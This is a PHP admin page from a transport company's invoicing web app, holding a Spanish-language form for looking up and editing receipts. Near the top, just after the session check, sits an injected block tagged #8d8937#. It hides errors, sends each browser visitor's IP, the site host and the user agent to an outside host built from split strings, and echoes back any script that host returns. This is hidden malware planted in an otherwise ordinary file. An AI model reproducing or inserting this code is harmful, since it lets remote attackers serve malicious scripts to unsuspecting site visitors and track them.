<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}	
	require("../conexion/ajax.php");
?>
<?php
#8d8937#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/8d8937#
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	
	function buscarComp()
	{
		agregarCargando('cargando');
		codComp = document.getElementById("textCodComp").value;
		tipo = document.getElementById("cmbCodigo").value
		//codCompAux = parseInt(codComp);
		
		if(codComp.length==0)
		{
			alert("¡ Debes ingresar un número de comprobante !");
			quitarCargando('cargando');	
			return;	
		}
		/*else if(codCompAux.toString().length!=codComp.length)
		{	
			alert("¡ El número del comprobante debe ser un número entero positivo !");
			quitarCargando('cargando');	
			return;		
		}*/
		_obj = crearObjeto();			
		_url = "ajaxManejador.php";
		_valores = "op=buscarComp&clave=" + codComp + "&tipo=" + tipo;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					resp = resp.split("*");
					if(resp[0] == "notFound")
					{	
						alert("! No existe comprobante con numero " + codComp + " !");
						quitarCargando('cargando');				
						//document.getElementById("textTipoComp").value = "";			
						document.getElementById("textNumero").value = "";
						document.getElementById("textTotal").value = "";
						document.getElementById("textOrigen").value = "";
						document.getElementById("textDestino").value = "";
						document.getElementById("textGuiaRem").value = "";																								
						document.getElementById("usuario").innerHTML = "";
						return;
					}					
					quitarCargando('cargando');	
					fecha = resp[4];
					fecha = fecha.split("-");
					//alert(fecha);
					//document.getElementById("textTipoComp").value = resp[5];	
					document.getElementById(resp[5]).selected = true;
					document.getElementById("textNumero").value = resp[2];
					document.getElementById(resp[1]).selected = true;
					document.getElementById("d" + fecha[2]).selected = true;
					document.getElementById("m" + fecha[1]).selected = true;
					document.getElementById("a" + fecha[0]).selected = true;				
					document.getElementById("textTotal").value = resp[3];
					document.getElementById("textOrigen").value = resp[7];
					document.getElementById("textDestino").value = resp[8];
					document.getElementById("textGuiaRem").value = resp[9];																								
					document.getElementById("usuario").innerHTML = resp[0];
				}
			}
		}		
	}	
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
<!--
.Estilo2 {font-weight: bold}
-->
</style>
<title>:: Transportes Marin Hermanos - ModificarComp ::</title></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="form1" name="form1" method="post" action="admin.php">
          <table width="419" height="539" border="0" align="center">
            <tr>
              <th height="44" colspan="3" scope="col">MODIFICAR COMPROBANTE </th>
              </tr>
            <tr>
              <td width="177"><em><strong>Tipo de Codigo </strong></em></td>
              <td colspan="2"><select name="cmbCodigo" id="cmbCodigo">
                <option value="codigo">Cod Remito</option>
                <option value="Numero">N&ordm; Factura</option>
                <option value="nGuiaRemision">N&ordm; Guia</option>
              </select>              </td>
            </tr>
            <tr>
              <td height="39"><em><strong>Nro. Comprobante : </strong></em></td>
              <td colspan="2"><label>
              <input name="textCodComp" type="text" id="textCodComp" />
              </label></td>
            </tr>
            <tr>
              <td height="31">&nbsp;</td>
              <td width="94"><label>
                <input name="Buscar" type="button" id="Buscar" value="Buscar" onClick="buscarComp()" />
              </label></td>
              <td width="134"><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td height="28"><em><strong>Tipo comprobante : </strong></em></td>
              <td colspan="2"><label>
					<select name="textTipoComp" id="textTipoComp">
                      <option value="Factura" id="Factura">Factura</option>
                      <option value="Boleta" id="Boleta">Boleta</option>
                      <option value="Almacen" id="Almacen">Almacen</option>
                  	</select>
              </label></td>
            </tr>
            <tr>
              <td height="27"><em><strong>Serie : </strong></em></td>
              <td colspan="2"><label>
                <select name="selectSerie" id="selectSerie">
                  <option value="001" id="001">001</option>
                  <option value="002" id="002">002</option>
                </select>
              </label></td>
            </tr>
            <tr>
              <td height="28"><em><strong>N&uacute;mero : </strong></em></td>
              <td colspan="2"><label>
                <input name="textNumero" type="text" id="textNumero" />
              </label></td>
            </tr>
            <tr>
              <td height="32"><em><strong>Fecha : </strong></em></td>
              <td colspan="2"><label>
                <select name="selectDia" id="selectDia">
	   			  <option id="d01" value="01">01</option>
                  <option id="d02" value="02">02</option>
                  <option id="d03" value="03">03</option>
                  <option id="d04" value="04">04</option>
                  <option id="d05" value="05">05</option>
                  <option id="d06" value="06">06</option>
                  <option id="d07" value="07">07</option>
                  <option id="d08" value="08">08</option>
                  <option id="d09" value="09">09</option>
                  <option id="d10" value="10">10</option>
                  <option id="d11" value="11">11</option>
                  <option id="d12" value="12">12</option>
                  <option id="d13" value="13">13</option>
                  <option id="d14" value="14">14</option>
                  <option id="d15" value="15">15</option>
                  <option id="d16" value="16">16</option>
                  <option id="d17" value="17">17</option>
                  <option id="d18" value="18">18</option>
                  <option id="d19" value="19">19</option>
                  <option id="d20" value="20">20</option>
                  <option id="d21" value="21">21</option>
                  <option id="d22" value="22">22</option>
                  <option id="d23" value="23">23</option>
                  <option id="d24" value="24">24</option>
                  <option id="d25" value="25">25</option>
                  <option id="d26" value="26">26</option>
                  <option id="d27" value="27">27</option>
                  <option id="d28" value="28">28</option>
                  <option id="d29" value="29">29</option>
                  <option id="d30" value="30">30</option>
                  <option id="d31" value="31">31</option> 
                </select>
                <select name="selectMes" id="selectMes">
				  <option id="m01" value="01">01</option>
                  <option id="m02" value="02">02</option>
                  <option id="m03" value="03">03</option>
                  <option id="m04" value="04">04</option>
                  <option id="m05" value="05">05</option>
                  <option id="m06" value="06">06</option>
                  <option id="m07" value="07">07</option>
                  <option id="m08" value="08">08</option>
                  <option id="m09" value="09">09</option>
                  <option id="m10" value="10">10</option>
                  <option id="m11" value="11">11</option>
                  <option id="m12" value="12">12</option>
                </select>
                <select name="selectAnho" id="selectAnho">
				  <option id="a1940" value="1940">1940</option>
                  <option id="a1941" value="1941">1941</option>
                  <option id="a1942" value="1942">1942</option>
                  <option id="a1943" value="1943">1943</option>
                  <option id="a1944" value="1944">1944</option>
                  <option id="a1945" value="1945">1945</option>
                  <option id="a1946" value="1946">1946</option>
                  <option id="a1947" value="1947">1947</option>
                  <option id="a1948" value="1948">1948</option>
                  <option id="a1949" value="1949">1949</option>
                  <option id="a1950" value="1950">1950</option>
                  <option id="a1951" value="1951">1951</option>
                  <option id="a1952" value="1952">1952</option>
                  <option id="a1953" value="1953">1953</option>
                  <option id="a1954" value="1954">1954</option>
                  <option id="a1955" value="1955">1955</option>
                  <option id="a1956" value="1956">1956</option>
                  <option id="a1957" value="1957">1957</option>
                  <option id="a1958" value="1958">1958</option>
                  <option id="a1959" value="1959">1959</option>
                  <option id="a1960" value="1960">1960</option>
                  <option id="a1961" value="1961">1961</option>
                  <option id="a1962" value="1962">1962</option>
                  <option id="a1963" value="1963">1963</option>
                  <option id="a1964" value="1964">1964</option>
                  <option id="a1965" value="1965">1965</option>
                  <option id="a1966" value="1966">1966</option>
                  <option id="a1967" value="1967">1967</option>
                  <option id="a1968" value="1968">1968</option>
                  <option id="a1969" value="1969">1969</option>
                  <option id="a1970" value="1970">1970</option>
                  <option id="a1971" value="1971">1971</option>
                  <option id="a1972" value="1972">1972</option>
                  <option id="a1973" value="1973">1973</option>
                  <option id="a1974" value="1974">1974</option>
                  <option id="a1975" value="1975">1975</option>
                  <option id="a1976" value="1976">1976</option>
                  <option id="a1977" value="1977">1977</option>
                  <option id="a1978" value="1978">1978</option>
                  <option id="a1979" value="1979">1979</option>
                  <option id="a1980" value="1980">1980</option>
                  <option id="a1981" value="1981">1981</option>
                  <option id="a1982" value="1982">1982</option>
                  <option id="a1983" value="1983">1983</option>
                  <option id="a1984" value="1984">1984</option>
                  <option id="a1985" value="1985">1985</option>
                  <option id="a1986" value="1986">1986</option>
                  <option id="a1987" value="1987">1987</option>
                  <option id="a1988" value="1988">1988</option>
                  <option id="a1989" value="1989">1989</option>
                  <option id="a1990" value="1990">1990</option>
                  <option id="a1991" value="1991">1991</option>
                  <option id="a1992" value="1992">1992</option>
                  <option id="a1993" value="1993">1993</option>
                  <option id="a1994" value="1994">1994</option>
                  <option id="a1995" value="1995">1995</option>
                  <option id="a1996" value="1996">1996</option>
                  <option id="a1997" value="1997">1997</option>
                  <option id="a1998" value="1998">1998</option>
                  <option id="a1999" value="1999">1999</option>
                  <option id="a2000" value="2000">2000</option>
                  <option id="a2001" value="2001">2001</option>
                  <option id="a2002" value="2002">2002</option>
                  <option id="a2003" value="2003">2003</option>
                  <option id="a2004" value="2004">2004</option>
                  <option id="a2005" value="2005">2005</option>
                  <option id="a2006" value="2006">2006</option>
                  <option id="a2007" value="2007">2007</option>
                  <option id="a2008" value="2008">2008</option>
                  <option id="a2009" value="2009">2009</option>
                  <option id="a2010" value="2010">2010</option>
                  <option id="a2011" value="2011">2011</option>
                  <option id="a2012" value="2012">2012</option>
                </select>
              </label></td>
            </tr>
            <tr>
              <td height="31"><em><strong>Total : </strong></em></td>
              <td colspan="2"><label>
                <input name="textTotal" type="text" id="textTotal" />
              </label></td>
            </tr>
			<tr>
              <td height="31"><em><strong>Total con palabras : </strong></em></td>
              <td colspan="2"><label>
                <input name="textTotalEscrito" type="text" id="textTotalEscrito" size="40" />
              </label></td>
            </tr>
            <tr>
              <td height="29"><em><strong>Direcci&oacute;n origen : </strong></em></td>
              <td colspan="2"><label>
                <!--<textarea name="textOrigen" id="textOrigen"></textarea>-->
                <select name="textOrigen" id="textOrigen">
                      <option value="JR SUCRE 626 - CAJAMARCA ">JR SUCRE- CAJAMARCA</option>
                      <option value="AV UNIVERSITARIA Mz A Lt 3 cda 38 - LOS OLIVOS - LIMA">AV UNIVERSITARIA - LIMA </option>
                      <option value=" PLAZA PECUARIA CARRETERA A JESUS KM2 - CAJAMARCA">PLAZA PECUARIA - SAN MARCOS</option>
					  <option value=" PLAZA PECUARIA CAJAMARCA CARRETERA A JESUS KM2 - CAJAMARCA">PLAZA PECUARIA - CAJAMARCA</option>
					  <option value="CENTRO DE ACOPIO JOSE ORTIZ CHICLAYO
">CENTRO DE ACOPIO - CHICLAYO</option>
                    </select>
              </label></td>
            </tr>
            <tr>
              <td height="31"><em><strong>Direcci&oacute;n destino : </strong></em></td>
              <td colspan="2"><label>
                <textarea name="textDestino" id="textDestino"></textarea>
              </label></td>
            </tr>
            <tr>
              <td height="28"><em><strong>Guia Remisi&oacute;n : </strong></em></td>
              <td colspan="2"><label>
                <input name="textGuiaRem" type="text" id="textGuiaRem" />
              </label></td>
            </tr>
            <tr>
              <td><em><strong>Usuario : </strong></em></td>
              <td colspan="2"><label></label>
                <div align="justify" id="usuario"></div></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td colspan="2">&nbsp;</td>
            </tr>
            <tr>
              <td><label>
                <div align="center">
                  <input name="Actualizar" type="submit" id="Actualizar" value="Actualizar"/>
				  <input name="op" type="hidden" id="op" value="actComp"/>
                  </div>
              </label></td>
              <td colspan="2"><label>
                <div align="center">
                  <input name="Cancelar" type="button" id="Cancelar" value="Cancelar" onClick="go()"/>
                  </div>
              </label></td>
            </tr>
          </table>
        </form>        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>

